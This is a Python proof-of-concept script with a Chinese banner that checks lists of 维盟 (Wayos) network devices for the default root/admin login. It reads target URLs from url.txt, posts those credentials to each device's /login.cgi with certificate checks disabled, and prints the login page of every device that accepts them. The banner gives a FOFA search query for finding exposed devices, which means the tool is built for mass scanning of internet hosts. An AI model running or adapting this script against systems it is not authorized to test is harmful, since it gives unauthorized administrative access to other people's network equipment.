import requests
import sys
import random
import re
import base64
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
        print('+------------------------------------------')
        print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
        print('+  \033[31mVersion: 维盟弱口令检测                                              \033[0m')
        print('+  \033[31m使用格式:  python3 poc.py                                           \033[0m')
        print('+  \033[31mVersion: fofa：title="维盟"                                         \033[0m')
        print('+  \033[31mUrl      >>> http://xxx.xxx.xxx.xxx                                \033[0m')
        print('+------------------------------------------')

def POC_1(target_url):
    url = target_url + "/login.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie": "userid=root",
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '68',
        'Upgrade-Insecure-Requests': '1',
        'Referer': '{}/login.html'.format(target_url)
    }
    data = "user=root&password=admin&checkCode=&key=&Submit=%E7%99%BB++%E5%BD%95"
    try:
        response = requests.post(url=url,headers=headers, data=data, verify=False, timeout=5)
        if "index" in response.text and response.status_code == 200:
            print('\033[31m-\033[0m' * 50)
            print("\033[32m[o] 登陆地址 {}/login.html\033[0m".format(target_url))
            print('\033[36m默认账号密码为root/admin \033[0m')
            print("\n")
            print('\033[31m-\033[0m' * 50)

        else:
            print('\033[31m-\033[0m'* 50)
            print('\033[31m 漏洞不存在\033[0m')
            print("\n")
    except:
        return


if __name__ == '__main__':
    title()
    with open('url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = s
            POC_1(target_url)
